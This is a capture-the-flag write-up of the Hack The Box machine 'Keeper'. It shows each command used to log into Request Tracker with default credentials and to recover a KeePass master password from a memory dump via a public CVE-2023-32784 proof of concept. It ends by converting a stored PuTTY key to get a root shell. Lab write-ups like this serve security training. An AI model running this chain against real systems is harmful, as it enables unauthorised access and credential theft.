# HTB Keeper — Writeup
**OS:** Ubuntu 22.04 (Jammy)
**Difficulty:** Easy
**Attack Vector:** Request Tracker default creds → KeePass CVE-2023-32784 master password dump → SSH key
**System:** Arch Linux

---

## Summary

Keeper is a Linux machine running nginx with Request Tracker (RT) on port 80. Default credentials (`root:password`) grant access to RT, where a user profile reveals SSH credentials for `lnorgaard`. On the box, a KeePass database and memory dump are found. CVE-2023-32784 extracts the master password from the dump, unlocking the database which contains a PuTTY SSH key for root.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -Pn -T4 10.129.229.41
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

### Web Enumeration

Visiting `http://10.129.229.41` redirects to a page with a link to `http://tickets.keeper.htb/rt/`.

Added hostnames to `/etc/hosts`:
```bash
echo '10.129.229.41 keeper.htb tickets.keeper.htb' | sudo tee -a /etc/hosts
```

The application is **Request Tracker (RT)** — an IT ticketing system.

---

## Exploitation

### Step 1 — Request Tracker Default Credentials

RT default credentials: `root:password`

Logged in and found user **lnorgaard** (Inorgaard) in the admin panel. Her user profile contains a comment with her password: `Welcome2023!`

### Step 2 — SSH as lnorgaard

```bash
ssh lnorgaard@10.129.229.41
# Password: Welcome2023!
```

User flag on the desktop:
```bash
cat ~/user.txt
```

### Step 3 — KeePass Memory Dump (CVE-2023-32784)

Found `RT30000.zip` in the home directory. Extracted it to find:
- `KeePassDumpFull.dmp` — KeePass process memory dump
- `passcodes.kdbx` — KeePass database

Transferred files to attack box:
```bash
scp lnorgaard@10.129.229.41:~/RT30000.zip .
```

Used CVE-2023-32784 PoC to extract the master password from the memory dump:
```bash
git clone https://github.com/matro7sh/keepass-dump-masterkey
python3 keepass-dump-masterkey/poc.py KeePassDumpFull.dmp
```

Output:
```
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
...
```

The first character and `ø` characters are not fully recovered, but the pattern is recognizable as the Danish phrase **"rødgrød med fløde"** (red berry pudding with cream).

### Step 4 — Open KeePass Database

`kpcli` failed to handle the Unicode password — used **KeePassXC** (GUI) instead:
```bash
keepassxc passcodes.kdbx
# Master password: rødgrød med fløde
```

Found an entry for `keeper.htb (Ticketing Server)`:
- **Username:** root
- **Password:** `F4><3K0nd!`
- **Notes:** Full PuTTY SSH private key (PPK format)

The password did not work for SSH — the PuTTY key is the actual access method.

### Step 5 — Convert PuTTY Key and SSH as Root

Saved the PPK key from the Notes field to `key.ppk`, then converted to OpenSSH format:
```bash
puttygen key.ppk -O private-openssh -o root_key
chmod 600 root_key
ssh -i root_key root@10.129.229.41
```

Root shell obtained.

```bash
cat /root/root.txt
```

---

## Flags

```
User: <submitted>
Root: <submitted>
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| `tickets.keeper.htb` not resolving | Add both `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts` |
| `kpcli` can't handle Unicode master password (`ø`) | Use `keepassxc` (GUI) instead — handles UTF-8 correctly |
| KeePass password from CVE-2023-32784 missing first char + special chars | Recognize the pattern — it's a well-known Danish phrase |
| PuTTY key (PPK) can't be used directly with SSH | `puttygen key.ppk -O private-openssh -o key` to convert |
| `puttygen` not installed | `sudo pacman -S putty` |
| KeePass password doesn't work for SSH | The PPK key in the Notes field is the real auth method, not the stored password |

---

## Tools Used

- `nmap` — reconnaissance and service detection
- `keepassxc` — opening KeePass database with Unicode master password
- `keepass-dump-masterkey` (CVE-2023-32784) — extracting master password from memory dump
- `puttygen` — converting PuTTY PPK key to OpenSSH format
- `scp` — file transfer from target

---

*Six machines down. Sometimes the password is a dessert.* 🏆
